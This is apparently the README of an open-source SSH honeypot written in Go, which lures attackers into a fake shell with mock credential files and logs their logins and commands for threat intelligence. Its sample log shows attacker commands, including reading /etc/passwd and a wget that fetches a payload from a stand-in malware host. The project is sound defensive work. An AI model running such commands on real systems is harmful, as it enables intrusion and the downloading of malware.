# SSH Honeypot

A production-grade SSH honeypot written in Go. Captures real attacker behaviour — credentials tried, commands executed, geographic origin — and exposes it through a live terminal dashboard and structured reports.

Deploy it on any internet-facing server and watch real attacks happen within minutes.

---

## Architecture

```
ssh-honeypot/
    cmd/honeypot/
        main.go                 Entry point, config loading, wiring
    internal/
        server/
            ssh.go              SSH server — accepts all connections, handles auth
            session.go          Per-session lifecycle management
            shell.go            Fake interactive Linux shell
        logger/
            logger.go           Structured console + file event logging
            db.go               SQLite schema, queries, and operations
        geoip/
            geoip.go            IP geolocation — MaxMind DB or ip-api.com fallback
        analyzer/
            analyzer.go         Threat scoring, pattern detection, session tracking
        dashboard/
            dashboard.go        Live TUI dashboard (tview)
        reporter/
            reporter.go         Markdown + HTML report generator
    data/
        honeypot.db             SQLite database (auto-created)
        host_key                RSA host key (auto-generated)
        sessions/               Per-session JSONL event logs
        reports/                Generated reports
    config.yaml                 Configuration
```

---

## Features

### SSH Server
- Listens on any port (default 2222, use 22 in production)
- Accepts **all connections** — logs every credential attempt
- Presents a realistic `OpenSSH_8.9p1 Ubuntu` banner
- Handles PTY requests, interactive shell, and exec commands
- Auto-generates a 4096-bit RSA host key on first run
- Accepts common default credentials (`root/root`, `admin/admin`, etc.) to lure attackers into the fake shell
- Configurable connection timeout and max concurrent connections

### Fake Shell
Responds to real Linux commands to keep attackers engaged:

| Command | Response |
|---------|----------|
| `whoami`, `id` | Realistic root user info |
| `uname -a` | Fake Linux kernel version |
| `ls /`, `ls /etc` | Realistic directory listings |
| `cat /etc/passwd` | Fake passwd file with real-looking entries |
| `cat /etc/shadow` | Permission denied |
| `cat .env` | **Lure**: Captures access to fake STRIPE/AWS keys |
| `cat db_config.json` | **Lure**: Mock production database credentials |
| `ps`, `w`, `uptime` | Fake process/user lists |
| `ifconfig`, `netstat` | Fake network interfaces |
| `wget`, `curl` | Hangs 2-3 seconds, then "connection timeout" |
| `history` | Empty — good opsec simulation |
| `find / -name passwd` | Returns realistic paths |

### Active Deception (Honey-Traps)
Includes "Honey-Files" in root and home directories containing fake high-value targets:
- `.env` with mock Stripe and AWS credentials
- `db_config.json` with fake production DB strings
- `.bash_history` (simulated empty or seeded)
- `/etc/ssh/sshd_config` realistic server config


### Threat Intelligence
Every session is scored 0-100 based on:
- Number of credential attempts
- Number of unique usernames tried (credential stuffing detection)
- Commands executed (interactive vs scanner)
- Attack speed (automated brute force detection)
- **Client Fingerprinting**: Captures the SSH version string (`libssh`, `Paramiko`, etc.) to identify automated bots vs. manual attackers.

Attack patterns classified as: `scanner` / `brute_force` / `credential_stuffing` / `interactive_session`


### SQLite Database
Structured schema with full query capability:

```sql
sessions     — id, ip, country, city, asn, isp, start_time, end_time, threat_score
credentials  — session_id, username, password, attempt, timestamp
commands     — session_id, command, response, timestamp
patterns     — ip, pattern_type, first_seen, last_seen, count
```

Query examples:
```sql
-- Most common passwords
SELECT password, COUNT(*) as c FROM credentials GROUP BY password ORDER BY c DESC LIMIT 20;

-- Which countries attack most
SELECT country, COUNT(*) FROM sessions GROUP BY country ORDER BY COUNT(*) DESC;

-- Sessions where attacker got a shell
SELECT * FROM sessions WHERE total_cmds > 0 ORDER BY total_cmds DESC;

-- IPs with brute force pattern
SELECT ip, count FROM patterns WHERE pattern_type = 'brute_force' ORDER BY count DESC;
```

### Live Dashboard
Real-time terminal UI showing:
- Active sessions with IP, country, threat level, duration
- Top passwords and usernames being tried
- Top attacker countries
- Live event log with color coding

### Reports
Auto-generated on schedule (daily/hourly) and on shutdown:
- **Markdown** — suitable for GitHub/Notion
- **HTML** — full dark-theme web report with tables
- **JSON** — SIEM-ready structured data for ELK/Splunk ingestion


### Real-time Alerts
- **Discord Integration** — Receive instant notifications when a critical threat is detected.
- Configurable threat thresholds for automated alerting.

---

## Requirements

- Go 1.22+
- Linux/macOS (or WSL on Windows)
- Optional: [MaxMind GeoLite2-City database](https://dev.maxmind.com/geoip/geolite2-free-geolocation-data) for offline GeoIP

---

## Installation

```bash
git clone https://github.com/AnassElhamri/ssh-honeypot.git
cd ssh-honeypot
go mod tidy
go build -o honeypot ./cmd/honeypot
```

---

## Usage

```bash
# Run with live dashboard
./honeypot

# Run without dashboard (plain log output)
./honeypot --no-dashboard

# Custom config file
./honeypot --config /etc/honeypot/config.yaml

# Generate a report and exit
./honeypot --report
```

---

## Configuration

Edit `config.yaml`:

```yaml
server:
  port: 2222          # Change to 22 for production (requires root or CAP_NET_BIND_SERVICE)
  max_connections: 100
  banner: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6"

shell:
  hostname: "ubuntu-server"    # What attackers see as the hostname
  response_delay_ms: 80        # Fake processing delay (makes it feel real)

geoip:
  database_path: "data/GeoLite2-City.mmdb"  # Optional — falls back to ip-api.com

reporter:
  schedule: "daily"            # daily or hourly

alerts:
  discord_webhook: "https://discord.com/api/webhooks/..." # Real-time alerts
```

---

## Production Deployment

```bash
# Run on port 22 (requires root or capability)
sudo setcap 'cap_net_bind_service=+ep' ./honeypot
./honeypot --config config.yaml

# Or use systemd
sudo cp honeypot /usr/local/bin/
sudo cp config.yaml /etc/honeypot/config.yaml
```

Example systemd service:
```ini
[Unit]
Description=SSH Honeypot
After=network.target

[Service]
ExecStart=/usr/local/bin/honeypot --config /etc/honeypot/config.yaml --no-dashboard
Restart=always
User=root
WorkingDirectory=/etc/honeypot

[Install]
WantedBy=multi-user.target
```

---

## Tech Stack

| Component | Technology |
|-----------|-----------|
| Language | Go 1.22 |
| SSH protocol | `golang.org/x/crypto/ssh` |
| Database | SQLite via `github.com/mattn/go-sqlite3` |
| TUI Dashboard | `github.com/rivo/tview` + `tcell` |
| GeoIP | MaxMind GeoLite2 / ip-api.com |
| Config | YAML via `gopkg.in/yaml.v3` |

---

## What You'll See

Within minutes of deploying on a public server:

```
2026-03-13 12:00:01 [INFO] NEW CONNECTION  ip=218.92.0.x       session=1
2026-03-13 12:00:01 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=root       ver=SSH-2.0-libssh-0.9.5
2026-03-13 12:00:02 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=123456     ver=SSH-2.0-libssh-0.9.5
2026-03-13 12:00:02 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=password   ver=SSH-2.0-libssh-0.9.5
2026-03-13 12:00:03 [INFO] GEOIP           ip=218.92.0.x       🇨🇳 China  Shanghai  China Telecom
2026-03-13 12:00:04 [INFO] AUTH ACCEPTED   ip=218.92.0.x       user=root  (honeypot shell)
2026-03-13 12:00:05 [INFO] COMMAND         ip=218.92.0.x       cmd=whoami
2026-03-13 12:00:06 [INFO] COMMAND         ip=218.92.0.x       cmd=cat /etc/passwd
2026-03-13 12:00:08 [INFO] COMMAND         ip=218.92.0.x       cmd=wget http://malware.example/payload.sh
2026-03-13 12:00:11 [INFO] DISCONNECT      ip=218.92.0.x       duration=10s  creds=3  cmds=4
```

---

## License

MIT
